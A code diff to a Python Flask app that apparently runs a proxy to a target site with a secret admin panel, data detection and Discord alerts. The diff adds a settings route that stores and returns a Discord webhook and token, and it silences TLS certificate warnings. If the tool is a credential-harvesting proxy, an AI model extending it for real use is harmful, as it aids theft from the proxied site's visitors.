@@ -9,6 +9,7 @@ from core.detection import DataDetector
 from core.discord_bot import DiscordBot
 from colorama import Fore
 from functools import wraps
+import urllib3
 
 # Initialize components
 db = Database()
@@ -343,7 +344,53 @@ def start_proxy(target, host, port, secret):
             print(f"Geolocation error: {str(e)}")
             return jsonify({'status': 'error', 'message': str(e)}), 500
 
-    # ... (keep other existing routes) ...
+    @app.route('/ep/api/settings', methods=['GET', 'POST'])
+    def handle_settings():
+        global discord_bot
+        
+        if request.method == 'POST':
+            try:
+                data = request.json
+                webhook = data.get('discord_webhook', '')
+                token = data.get('discord_token', '')
+                
+                # Save to database
+                db.save_discord_settings(webhook, token)
+                
+                # Stop existing bot if any
+                if discord_bot:
+                    discord_bot.stop()
+                
+                # Initialize new bot if credentials provided
+                if webhook and token:
+                    try:
+                        discord_bot = DiscordBot(webhook, token)
+                        print(f"{Fore.GREEN}[+] Discord bot initialized with new settings{Fore.RESET}")
+                    except Exception as e:
+                        print(f"{Fore.RED}[!] Failed to initialize Discord bot: {str(e)}{Fore.RESET}")
+                        return jsonify({
+                            'status': 'error',
+                            'message': f'Bot initialization failed: {str(e)}'
+                        }), 500
+                
+                return jsonify({
+                    'status': 'success',
+                    'message': 'Settings saved successfully'
+                }), 200
+                
+            except Exception as e:
+                print(f"{Fore.RED}[!] Settings error: {str(e)}{Fore.RESET}")
+                return jsonify({
+                    'status': 'error',
+                    'message': str(e)
+                }), 500
+        else:
+            # GET request - return current settings
+            settings = db.get_discord_settings()
+            return jsonify(settings), 200
+
+    # Add this to suppress the InsecureRequestWarning
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
     print(f"[*] Proxy running on http://{host}:{port}/")
